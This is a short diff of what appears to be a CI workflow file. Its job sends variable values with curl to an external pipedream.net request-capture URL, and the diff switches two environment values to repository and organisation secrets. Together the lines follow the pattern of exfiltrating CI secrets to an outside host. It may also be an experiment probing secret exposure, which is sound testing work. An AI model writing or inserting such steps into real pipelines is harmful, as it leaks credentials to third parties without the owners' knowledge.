@@ -15,5 +15,5 @@ jobs:
           curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_XYZ
           curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
         env:
-          VALUE: ${{ env.PARENT_TEST }}
-          VALUE2: ${{ env.ORG_SEC }}
+          VALUE: ${{ secrets.PARENT_TEST }}
+          VALUE2: ${{ secrets.ORG_SEC }}
